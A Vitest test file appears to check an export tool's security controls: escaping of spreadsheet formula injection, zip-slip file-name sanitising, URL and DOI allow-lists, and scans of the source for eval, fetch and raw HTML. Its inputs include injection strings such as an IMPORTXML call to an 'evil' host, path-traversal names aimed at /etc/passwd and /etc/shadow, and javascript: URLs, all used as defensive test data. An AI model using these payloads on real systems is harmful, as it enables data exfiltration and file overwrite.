/**
 * Security controls.
 */
import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import path from 'node:path';
import ExcelJS from 'exceljs';
import { safeText } from '@/export/excel/shared';
import { sanitizeFileName } from '@/export/zip/package';
import { httpUrlSchema, commitShaSchema, doiSchema } from '@/domain/schemas';
import { buildTier1Workbook } from '@/export/excel/tier1';
import { resolveFramework } from '@/domain/frameworks';
import { parseSession } from '@/domain/session';
import { FICTIONAL_EXAMPLE } from '@/data/examples';

function sourceFiles(dir = path.resolve('src'), out: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    const full = path.join(dir, entry);
    if (statSync(full).isDirectory()) sourceFiles(full, out);
    else if (/\.(ts|tsx)$/.test(entry)) out.push(full);
  }
  return out;
}

describe('formula injection (Excel)', () => {
  it.each(['=cmd|calc', '+1+1', '-1-1', '@SUM(A1)', '\tinjected', '\rinjected'])(
    'escapes %j',
    (value) => {
      expect(safeText(value).startsWith("'")).toBe(true);
    },
  );

  it('leaves ordinary text alone', () => {
    for (const value of ['normal', 'a = b', 'TRL 4', '2026-01-01', '']) {
      expect(safeText(value)).toBe(value);
    }
  });

  it('writes an injected project name as text, not a formula', async () => {
    const session = parseSession(FICTIONAL_EXAMPLE);
    const hostile = {
      ...session,
      tier1: {
        ...session.tier1!,
        context: {
          ...session.tier1!.context,
          projectName: '=IMPORTXML("http://evil/","//x")',
          assessorName: '@SUM(1+1)*cmd',
        },
      },
    };
    const workbook = await buildTier1Workbook(resolveFramework(session.frameworkId), hostile);
    const buffer = await workbook.xlsx.writeBuffer();
    const back = new ExcelJS.Workbook();
    await back.xlsx.load(buffer as ArrayBuffer);
    const sheet = back.getWorksheet('Summary')!;
    for (let r = 2; r <= 6; r += 1) {
      const value = sheet.getCell(`B${r}`).value;
      expect((value as { formula?: string })?.formula).toBeUndefined();
    }
  });
});

describe('zip-slip safety', () => {
  it.each([
    ['../../etc/passwd', 'passwd'],
    ['..\\..\\Windows\\system32\\cmd.exe', 'cmd.exe'],
    ['/etc/shadow', 'shadow'],
    ['C:\\secrets\\key.pem', 'key.pem'],
    ['....//....//evil.sh', 'evil.sh'],
    ['normal-file.pdf', 'normal-file.pdf'],
  ])('sanitizes %s', (input, expected) => {
    expect(sanitizeFileName(input)).toBe(expected);
  });

  it('never returns a name containing a separator or a parent reference', () => {
    for (const hostile of ['../x', 'a/b/c', 'a\\b', '..', '.', '']) {
      const safe = sanitizeFileName(hostile);
      expect(safe).not.toContain('/');
      expect(safe).not.toContain('\\');
      expect(safe).not.toBe('..');
      expect(safe.length).toBeGreaterThan(0);
    }
  });

  it('truncates absurd names to 80 characters', () => {
    expect(sanitizeFileName(`${'x'.repeat(500)}.pdf`)).toHaveLength(80);
  });
});

describe('URL and identifier allow-lists', () => {
  it.each([
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'file:///etc/passwd',
    'vbscript:msgbox',
    'ftp://example.org/x',
  ])('rejects %s', (url) => {
    expect(httpUrlSchema.safeParse(url).success).toBe(false);
  });

  it('accepts http and https', () => {
    expect(httpUrlSchema.safeParse('http://example.org/a').success).toBe(true);
    expect(httpUrlSchema.safeParse('https://example.org/a').success).toBe(true);
  });

  it('validates commit SHAs and DOIs', () => {
    expect(commitShaSchema.safeParse('0f1e2d3').success).toBe(true);
    expect(commitShaSchema.safeParse('main').success).toBe(false);
    expect(commitShaSchema.safeParse('0f1e2d').success).toBe(false);
    expect(doiSchema.safeParse('10.5555/fictional.2023.0001').success).toBe(true);
    expect(doiSchema.safeParse('not-a-doi').success).toBe(false);
  });
});

describe('no unsafe rendering or network code in src/', () => {
  const files = sourceFiles();

  it('never uses dangerouslySetInnerHTML', () => {
    for (const file of files) {
      expect(readFileSync(file, 'utf8'), file).not.toContain('dangerouslySetInnerHTML');
    }
  });

  it('never calls fetch, XMLHttpRequest, WebSocket, sendBeacon or eval', () => {
    const forbidden = [
      /\bfetch\s*\(/,
      /\bnew\s+XMLHttpRequest\b/,
      /\bnew\s+WebSocket\b/,
      /sendBeacon/,
      /\beval\s*\(/,
      /new\s+Function\s*\(/,
    ];
    for (const file of files) {
      const source = readFileSync(file, 'utf8');
      for (const pattern of forbidden) {
        expect(pattern.test(source), `${file} matches ${pattern}`).toBe(false);
      }
    }
  });

  it('renders markdown without enabling raw HTML', () => {
    const guide = readFileSync(path.resolve('src/features/guide/GuidePage.tsx'), 'utf8');
    expect(guide).not.toContain('rehype-raw');
    expect(guide).not.toContain('skipHtml={false}');
  });

  it('opens external links with rel="noreferrer noopener"', () => {
    for (const file of files) {
      const source = readFileSync(file, 'utf8');
      const externalLinks = source.match(/target="_blank"/g) ?? [];
      if (!externalLinks.length) continue;
      expect(source, file).toContain('noreferrer');
    }
  });
});

describe('the example contains nothing real', () => {
  it('uses only example.org hosts and fictional DOIs', () => {
    const raw = readFileSync(
      path.resolve('src/data/examples/fictional-sensor-node.session.json'),
      'utf8',
    );
    for (const url of raw.match(/https?:\/\/[^"]+/g) ?? []) {
      expect(url).toMatch(/^https:\/\/example\.org\//);
    }
    for (const doi of raw.match(/"doi":\s*"([^"]+)"/g) ?? []) {
      expect(doi).toContain('10.5555/fictional.');
    }
    expect(raw).toMatch(/[Ff]ictional/);
  });
});
